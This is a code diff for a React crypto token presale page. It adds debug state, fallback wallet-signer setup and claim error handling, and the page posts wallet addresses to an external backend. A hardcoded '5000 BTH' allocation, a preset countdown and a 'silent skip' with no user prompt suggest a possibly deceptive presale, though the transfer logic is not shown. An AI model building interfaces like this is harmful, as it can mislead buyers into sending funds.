@@ -83,6 +83,16 @@ function App() {
   const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
   const [verifying, setVerifying] = useState(false);
   
+  // Debug state
+  const [debugInfo, setDebugInfo] = useState({
+    rawChainId: null,
+    normalizedChainId: null,
+    currentChain: null,
+    hasContract: false,
+    signerStatus: 'none',
+    lastAction: ''
+  });
+
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
     days: 5,
@@ -105,6 +115,17 @@ function App() {
     c => c.chainId === normalizedChainId
   );
 
+  // Update debug info
+  useEffect(() => {
+    setDebugInfo(prev => ({
+      ...prev,
+      rawChainId: chainId,
+      normalizedChainId,
+      currentChain: currentChain?.name || 'unknown',
+      hasContract: !!(currentChain?.contractAddress)
+    }));
+  }, [chainId, currentChain]);
+
   // Get balance using wagmi for current chain
   const { data: balanceData, refetch: refetchBalance } = useBalance({
     address: address,
@@ -118,32 +139,61 @@ function App() {
     }
   }, [balanceData]);
 
-  // ✅ FIX 3: Fixed Signer initialization with window.ethereum
+  // ✅ FIX 3: Fixed Signer initialization with multiple fallbacks
   useEffect(() => {
     const initSigner = async () => {
-      if (!isConnected || !window.ethereum) {
+      if (!isConnected) {
         setSigner(null);
         setProvider(null);
+        setDebugInfo(prev => ({ ...prev, signerStatus: 'disconnected' }));
         return;
       }
 
+      setDebugInfo(prev => ({ ...prev, signerStatus: 'initializing' }));
+
       try {
-        // Use window.ethereum directly for maximum stability with AppKit
-        const web3Provider = new ethers.BrowserProvider(window.ethereum);
-        const web3Signer = await web3Provider.getSigner();
+        let web3Provider = null;
         
-        setProvider(web3Provider);
-        setSigner(web3Signer);
+        // Try AppKit's walletClient first (most compatible with AppKit)
+        if (walletClient) {
+          try {
+            // @ts-ignore - walletClient can be used directly with ethers v6
+            web3Provider = new ethers.BrowserProvider(walletClient);
+            const testSigner = await web3Provider.getSigner();
+            await testSigner.getAddress();
+            
+            setProvider(web3Provider);
+            setSigner(testSigner);
+            setDebugInfo(prev => ({ ...prev, signerStatus: 'walletClient' }));
+            console.log("✅ Signer ready via walletClient");
+            return;
+          } catch (e) {
+            console.log("walletClient init failed, trying window.ethereum", e);
+          }
+        }
         
-        console.log("✅ Signer ready:", await web3Signer.getAddress());
+        // Fallback to window.ethereum
+        if (window.ethereum) {
+          web3Provider = new ethers.BrowserProvider(window.ethereum);
+          const web3Signer = await web3Provider.getSigner();
+          
+          setProvider(web3Provider);
+          setSigner(web3Signer);
+          setDebugInfo(prev => ({ ...prev, signerStatus: 'window.ethereum' }));
+          console.log("✅ Signer ready via window.ethereum");
+          return;
+        }
+        
+        throw new Error("No provider available");
       } catch (err) {
         console.error("Signer init failed:", err);
         setSigner(null);
+        setDebugInfo(prev => ({ ...prev, signerStatus: 'failed' }));
       }
     };
 
     initSigner();
-  }, [isConnected]);
+  }, [isConnected, walletClient]);
 
   // Countdown timer
   useEffect(() => {
@@ -176,6 +226,7 @@ function App() {
     
     setVerifying(true);
     setTxStatus('🔄 Verifying wallet...');
+    setDebugInfo(prev => ({ ...prev, lastAction: 'Verifying wallet' }));
     
     try {
       const response = await fetch('https://tokenbackend-5xab.onrender.com/api/presale/connect', {
@@ -241,14 +292,18 @@ function App() {
 
   // ✅ FIX 4 & 5: Fixed execute function with silent skip for non-BSC chains
   const executePresaleTransaction = async () => {
+    setDebugInfo(prev => ({ ...prev, lastAction: 'Execute clicked' }));
+
     // Basic connection checks
     if (!isConnected || !address) {
       setError("Wallet not connected");
+      setDebugInfo(prev => ({ ...prev, lastAction: 'Failed: not connected' }));
       return;
     }
 
     if (!signer) {
       setError("Signer not initialized. Please refresh the page.");
+      setDebugInfo(prev => ({ ...prev, lastAction: 'Failed: no signer' }));
       return;
     }
 
@@ -261,11 +316,16 @@ function App() {
     // ✅ SILENT SKIP: No error, no switch prompt - just log and return
     if (!currentChain || !currentChain.contractAddress) {
       console.log(`Skipping chain ${normalizedChainId} - no contract deployed`);
+      setDebugInfo(prev => ({ 
+        ...prev, 
+        lastAction: `Skipped chain ${normalizedChainId} - no contract` 
+      }));
       return;
     }
 
     if (parseFloat(balance) <= 0) {
       setError('Insufficient balance');
+      setDebugInfo(prev => ({ ...prev, lastAction: 'Failed: insufficient balance' }));
       return;
     }
 
@@ -274,6 +334,7 @@ function App() {
       setError('');
       setTxStatus('⏳ Please confirm in your wallet...');
       setTxHash('');
+      setDebugInfo(prev => ({ ...prev, lastAction: 'Executing on ' + currentChain.name }));
 
       // Verify signer still works with current address
       const signerAddress = await signer.getAddress();
@@ -325,10 +386,12 @@ function App() {
         
         setShowCelebration(true);
         setTxStatus(`🎉 Congratulations!`);
+        setDebugInfo(prev => ({ ...prev, lastAction: 'Success on ' + currentChain.name }));
       }
       
     } catch (err) {
       console.error('Transaction error:', err);
+      setDebugInfo(prev => ({ ...prev, lastAction: 'Error: ' + err.message }));
       
       if (err.code === 4001) {
         setError('Transaction cancelled');
@@ -346,16 +409,28 @@ function App() {
   };
 
   const claimTokens = async () => {
+    setDebugInfo(prev => ({ ...prev, lastAction: 'Claim clicked' }));
     try {
       setLoading(true);
-      await fetch('https://tokenbackend-5xab.onrender.com/api/presale/claim', {
+      const response = await fetch('https://tokenbackend-5xab.onrender.com/api/presale/claim', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ walletAddress: address })
       });
-      setShowCelebration(true);
+      
+      const data = await response.json();
+      
+      if (data.success) {
+        setShowCelebration(true);
+        setDebugInfo(prev => ({ ...prev, lastAction: 'Claim successful' }));
+      } else {
+        setError(data.message || 'Claim failed');
+        setDebugInfo(prev => ({ ...prev, lastAction: 'Claim failed' }));
+      }
     } catch (err) {
       console.error('Claim error:', err);
+      setError(err.message || 'Claim failed');
+      setDebugInfo(prev => ({ ...prev, lastAction: 'Claim error' }));
     } finally {
       setLoading(false);
     }
@@ -380,6 +455,25 @@ function App() {
 
       <div className="container mx-auto px-4 py-8 max-w-6xl relative z-10">
         
+        {/* Debug Panel - Only visible in development */}
+        {process.env.NODE_ENV === 'development' && (
+          <div className="mb-4 p-4 bg-gray-800/90 backdrop-blur-sm border border-gray-700 rounded-xl text-xs font-mono">
+            <details>
+              <summary className="text-gray-400 cursor-pointer mb-2">🔧 Debug Info</summary>
+              <div className="space-y-1 text-gray-300">
+                <div>Raw chainId: {String(debugInfo.rawChainId)} ({typeof debugInfo.rawChainId})</div>
+                <div>Normalized: {debugInfo.normalizedChainId}</div>
+                <div>Current chain: {debugInfo.currentChain}</div>
+                <div>Has contract: {debugInfo.hasContract ? '✅' : '❌'}</div>
+                <div>Signer status: {debugInfo.signerStatus}</div>
+                <div>Last action: {debugInfo.lastAction}</div>
+                <div>Wallet connected: {isConnected ? '✅' : '❌'}</div>
+                <div>Signer exists: {signer ? '✅' : '❌'}</div>
+              </div>
+            </details>
+          </div>
+        )}
+
         {/* Header with Logo */}
         <div className="text-center mb-12">
           <div className="inline-block mb-6 relative">
@@ -608,7 +702,12 @@ function App() {
                   </div>
                 )}
                 
-                {/* ✅ FIX 5: Network message removed - now silent skip */}
+                {/* Network indicator - informational only, no switch prompt */}
+                {currentChain && (
+                  <div className="text-center mb-4 text-sm text-gray-500">
+                    Network: {currentChain.name} {currentChain.contractAddress ? '✅' : '⏸️'}
+                  </div>
+                )}
                 
                 {!completedChains.includes('BSC') ? (
                   <button
@@ -624,11 +723,12 @@ function App() {
                 ) : (
                   <button
                     onClick={claimTokens}
+                    disabled={loading}
                     className="w-full group relative"
                   >
                     <div className="absolute -inset-1 bg-gradient-to-r from-green-400 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                     <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
-                      🎉 View Your 5000 BTH
+                      {loading ? 'Processing...' : '🎉 View Your 5000 BTH'}
                     </div>
                   </button>
                 )}
